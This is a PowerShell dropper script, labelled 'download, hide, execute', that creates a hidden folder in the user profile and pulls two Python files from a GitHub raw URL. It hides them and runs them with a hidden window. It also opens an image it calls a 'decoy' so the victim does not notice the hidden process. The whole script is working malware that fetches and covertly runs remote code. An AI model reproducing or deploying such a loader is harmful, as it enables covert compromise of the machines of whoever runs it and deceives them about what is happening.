# ============================================
# pp.ps1 - download, hide, execute (FIXED)
# ============================================

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$configPath = Join-Path $env:USERPROFILE ".configs"
if (-not (Test-Path -Path $configPath)) {
    New-Item -Path $configPath -ItemType Directory -Force | Out-Null
}


$d = Get-Item -LiteralPath $configPath -Force
$d.Attributes = $d.Attributes -bor [System.IO.FileAttributes]::Hidden


function Save-HiddenFile {
    param([string]$Url, [string]$Path)
    if (Test-Path -LiteralPath $Path) {
        try { (Get-Item -LiteralPath $Path -Force).Attributes = 'Normal' } catch {}
    }
    Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
    $f = Get-Item -LiteralPath $Path -Force
    $f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
}

# ---- 1. pypy.py (source = client.py) ----
$finalPath = Join-Path $configPath "client.py"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py" -Path $finalPath


# ---- 2. auto.py ----
$finalPath3 = Join-Path $configPath "auto.py"

Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py" -Path $finalPath3


# ---- 3. boss.jpg  (DISABLED - uncomment below to re-enable) ----
$finalPath2 = Join-Path $configPath "boss.jpg"

Save-HiddenFile -Url "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHpvfIYHGkZ6M9dOr1K7hSRGgvADhQ2U0FHyj6qJ5Lb5CAKJSO1NQGvhxm&s=10" -Path $finalPath2


# ---- 5. Launch (single process) ----

$launchArgs = @('-3', '-u', "`"$finalPath3`"", "`"$finalPath`"", '--hidden')

Start-Process -FilePath 'py' -ArgumentList $launchArgs -WorkingDirectory $configPath -WindowStyle Hidden


# ---- 6. Open decoy image (DISABLED - uncomment below to re-enable) ----
# ---- 6. Open decoy image (via visible temp copy) ----
if (Test-Path -LiteralPath $finalPath2) {
    $tempImg = Join-Path $env:TEMP ("boss_" + [Guid]::NewGuid().ToString('N') + ".jpg")
    Copy-Item -LiteralPath $finalPath2 -Destination $tempImg -Force
    Start-Process -FilePath $tempImg
    # clean up the temp copy in 60s (image viewer keeps the file open while shown)
    Start-Job -ScriptBlock {
        Start-Sleep -Seconds 60
        Remove-Item -LiteralPath $using:tempImg -Force -ErrorAction SilentlyContinue
    } | Out-Null
}
